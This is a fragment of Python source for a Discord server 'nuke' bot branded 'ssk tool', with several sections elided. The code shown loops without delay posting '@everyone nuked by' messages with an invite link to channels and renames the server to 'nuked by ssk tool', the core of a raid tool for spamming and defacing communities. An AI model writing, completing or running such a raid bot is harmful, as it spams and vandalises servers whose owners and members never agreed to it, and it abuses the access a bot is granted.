...
print(Fore.LIGHTBLUE_EX +  "owned by zitsuro")
...
async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone nuked by https://discord.gg/276hR3Zy or ssk tool " + spam_message)
        await asyncio.sleep(0)
        print(Fore.GREEN + "spammed:", channel.name)

@bot.event
async def on_ready():
    print(f"ssk is ready as {bot.user}")
    ...
    if guild:
        ignore_channel_name = "ZITSURO SMRDI"
    ...
    try:
        ...
        await guild.edit(name="nuked by ssk tool")
